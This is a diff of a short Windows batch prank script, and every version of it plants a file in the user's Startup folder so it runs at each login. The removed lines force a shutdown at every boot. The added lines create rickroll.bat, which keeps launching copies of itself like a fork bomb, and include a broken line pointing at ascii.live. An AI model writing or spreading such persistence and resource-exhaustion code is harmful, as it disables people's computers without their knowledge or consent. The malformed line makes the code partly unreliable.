@@ -1,4 +1,8 @@
 @echo off
 cd "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup"
-echo shutdown /f > inst.bat
-shutdown /f
+(
+    echo cls
+    echo start rickroll.bat
+    echo ascii.live/can-you-hear-me
+) >rickroll.bat
+rickroll.bat
